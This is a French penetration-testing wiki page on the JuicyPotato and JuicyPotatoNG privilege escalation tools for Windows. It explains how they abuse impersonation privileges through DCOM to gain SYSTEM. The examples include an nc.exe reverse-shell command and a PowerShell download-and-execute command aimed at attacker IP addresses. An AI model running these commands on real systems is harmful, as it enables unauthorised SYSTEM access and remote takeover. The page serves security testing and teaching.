# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato est legacy. Il fonctionne généralement sur les versions de Windows jusqu’à Windows 10 1803 / Windows Server 2016. Les modifications introduites par Microsoft à partir de Windows 10 1809 / Server 2019 ont cassé la technique originale. Pour ces versions et les suivantes, envisagez des alternatives modernes telles que PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato, entre autres. Consultez la page ci-dessous pour connaître les options et l’utilisation à jour.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abuser des privilèges dorés) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Une version améliorée de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, avec un peu de jus, c’est-à-dire **un autre outil de Local Privilege Escalation, permettant de passer de Windows Service Accounts à NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Vous pouvez télécharger juicypotato depuis [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notes rapides sur la compatibilité

- Fonctionne de manière fiable jusqu’à Windows 10 1803 et Windows Server 2016 lorsque le contexte actuel dispose de SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Cassé par le hardening de Microsoft dans Windows 10 1809 / Windows Server 2019 et les versions ultérieures. Préférez les alternatives liées ci-dessus pour ces versions.

### Résumé <a href="#summary" id="summary"></a>

[**Depuis le Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) et ses [variants](https://github.com/decoder-it/lonelypotato) exploitent la chaîne de privilege escalation basée sur le [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) ayant le listener MiTM sur `127.0.0.1:6666`, lorsque vous disposez des privilèges `SeImpersonate` ou `SeAssignPrimaryToken`. Lors de l’examen d’une build Windows, nous avons trouvé une configuration dans laquelle `BITS` était intentionnellement désactivé et le port `6666` était déjà utilisé.

Nous avons décidé de weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) : **dites bonjour à Juicy Potato**.

> Pour la théorie, consultez [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) et suivez la chaîne de liens et de références.<sup>[[4]](#references)</sup>

Outre `BITS`, plusieurs serveurs COM peuvent être exploités. Ils doivent seulement :

1. être instanciables par l’utilisateur actuel, normalement un « utilisateur de service » disposant de privilèges d’impersonation
2. implémenter l’interface `IMarshal`
3. s’exécuter avec un utilisateur élevé (SYSTEM, Administrator, …)

Après plusieurs tests, nous avons obtenu et testé une liste complète de [CLSID intéressants](http://ohpe.it/juicy-potato/CLSID/) sur plusieurs versions de Windows.

### Détails de Juicy <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vous permet de :<sup>[[1]](#references)</sup>

- **Target CLSID** _choisir le CLSID de votre choix._ [_Vous trouverez ici_](http://ohpe.it/juicy-potato/CLSID/) _la liste organisée par OS._
- **COM Listening port** _définir le port d’écoute COM de votre choix (au lieu du port 6666 codé en dur dans le marshalled)_
- **COM Listening IP address** _lier le serveur à n’importe quelle IP_
- **Process creation mode** _selon les privilèges de l’utilisateur impersonated, vous pouvez choisir parmi :_
- `CreateProcessWithToken` (nécessite `SeImpersonate`)
- `CreateProcessAsUser` (nécessite `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _lancer un exécutable ou un script si l’exploitation réussit_
- **Process Argument** _personnaliser les arguments du processus lancé_
- **RPC Server address** _pour une approche stealthy, vous pouvez vous authentifier auprès d’un serveur RPC externe_
- **RPC Server port** _utile si vous souhaitez vous authentifier auprès d’un serveur externe et que le firewall bloque le port `135`…_
- **TEST mode** _principalement à des fins de test, c’est-à-dire pour tester les CLSID. Il crée le DCOM et affiche l’utilisateur du token. Voir_ [_ici pour les tests_](http://ohpe.it/juicy-potato/Test/)

### Utilisation <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Réflexions finales <a href="#final-thoughts" id="final-thoughts"></a>

[**Depuis le Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)** :**<sup>[[1]](#references)</sup>

Si l’utilisateur dispose des privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, alors vous êtes **SYSTEM**.

Il est presque impossible d’empêcher l’abus de tous ces COM Servers. Vous pourriez envisager de modifier les permissions de ces objets via `DCOMCNFG`, mais bonne chance : cela sera difficile.

La véritable solution consiste à protéger les comptes et applications sensibles qui s’exécutent sous les comptes `* SERVICE`. Arrêter `DCOM` empêcherait certainement cet exploit, mais pourrait avoir un impact sérieux sur le système d’exploitation sous-jacent.

Depuis : [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG réintroduit une local privilege escalation de type JuicyPotato sur les versions modernes de Windows en combinant :<sup>[[2]](#references)</sup>
- La résolution DCOM OXID vers un serveur RPC local sur un port choisi, évitant le listener historique codé en dur sur 127.0.0.1:6666.
- Un hook SSPI permettant de capturer et d’usurper l’authentification SYSTEM entrante sans nécessiter RpcImpersonateClient, ce qui permet également d’utiliser CreateProcessAsUser lorsque seul SeAssignPrimaryTokenPrivilege est présent.
- Des astuces pour satisfaire les contraintes d’activation DCOM (par exemple, l’ancienne exigence d’appartenance au groupe INTERACTIVE lors du ciblage des classes PrintNotify / ActiveX Installer Service).

Notes importantes (comportement susceptible d’évoluer selon les builds) :<sup>[[2]](#references)</sup>
- Septembre 2022 : La technique initiale fonctionnait sur les cibles Windows 10/11 et Server prises en charge en utilisant l’« INTERACTIVE trick ».
- Mise à jour de janvier 2023 des auteurs : Microsoft a ensuite bloqué l’INTERACTIVE trick. Un autre CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) rétablit l’exploitation, mais uniquement sur Windows 11 / Server 2022, selon leur publication.

Utilisation basique (davantage de flags sont disponibles dans l’aide) :
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Si vous ciblez Windows 10 1809 / Server 2019, où JuicyPotato classique est corrigé, préférez les alternatives indiquées en haut (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG peut être utilisé selon la build et l’état du service.

## Exemples

Remarque : consultez [cette page](https://ohpe.it/juicy-potato/CLSID/) pour obtenir une liste de CLSID à essayer.

### Obtenir un reverse shell avec nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lancer un nouveau CMD (si vous avez un accès RDP)

![Powershell rev - Lancer un nouveau CMD (si vous avez un accès RDP) : Lancer un nouveau CMD (si vous avez un accès RDP)](<../../images/image (300).png>)

## Problèmes de CLSID

Souvent, le CLSID par défaut utilisé par JuicyPotato **ne fonctionne pas** et l'exploit échoue. Il faut généralement effectuer plusieurs tentatives pour trouver un **CLSID fonctionnel**. Pour obtenir une liste de CLSID à essayer pour un système d'exploitation spécifique, consultez cette page :

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Vérification des CLSID**

Tout d'abord, vous aurez besoin de quelques exécutables en plus de juicypotato.exe.

Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, puis téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSID possibles à tester.

Téléchargez ensuite [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(modifiez le chemin vers la liste de CLSID et vers l'exécutable juicypotato), puis exécutez-le. Il commencera à tester chaque CLSID et, **lorsque le numéro de port changera, cela signifiera que le CLSID a fonctionné**.

**Vérifiez** les CLSID fonctionnels **à l'aide du paramètre -c**

## References

- [1] [README de Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Donner une seconde chance à JuicyPotato : JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Page du projet Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalade de privilèges des comptes de service vers SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
